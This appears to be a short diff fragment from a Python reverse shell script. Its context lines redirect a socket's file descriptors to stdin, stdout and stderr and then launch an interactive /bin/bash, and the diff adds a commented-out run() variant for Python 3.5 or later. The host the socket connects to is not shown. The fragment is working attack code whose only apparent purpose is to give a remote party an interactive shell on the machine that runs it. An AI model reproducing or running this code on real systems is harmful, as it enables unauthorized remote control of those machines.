@@ -9,3 +9,5 @@ dup2(s.fileno(),0)
 dup2(s.fileno(),1) 
 dup2(s.fileno(),2) 
 call(["/bin/bash","-i"])
+#Use line below for Python 3.5 or greater
+#run(["/bin/bash","-i"])
